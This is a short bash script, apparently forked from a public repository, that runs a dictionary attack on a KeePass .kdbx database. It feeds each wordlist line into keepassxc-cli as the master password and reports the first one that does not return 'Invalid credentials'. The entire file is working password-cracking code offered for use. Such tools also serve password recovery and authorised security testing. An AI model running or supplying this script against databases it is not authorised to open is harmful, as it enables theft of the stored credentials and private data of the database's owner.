#!/bin/bash

# Forked from https://github.com/r3nt0n/keepass4brute and fixed to
# work with the recent keepassxc-cli (requires a quit command).

if [ $# -ne 2 ]
then
  echo "Usage $0 <kdbx-file> <wordlist>"
  exit 2
fi

dep="keepassxc-cli"
command -v $dep >/dev/null 2>&1 || { echo >&2 "Error: $dep not installed.  Aborting."; exit 1; }

n_total=$( wc -l < "$2" )
n_tested=0

IFS=''
while read -r line; do
  n_tested=$((n_tested + 1))
  echo -ne "[+] Words tested: $n_tested/$n_total ($line)                                          \r"


# Run the command with the password provided
output=$(echo -e "$line\nquit\n" | keepassxc-cli open "$1" 2>&1)

# Check if the output contains "Invalid credentials"
if ! echo "$output" | grep -q "Invalid credentials"; then
    echo -ne "\n"
    echo "[*] Password found: \"$line\""; exit 0;
fi

done < $2

echo -ne "\n"
echo "[!] Wordlist exhausted."; exit 3;
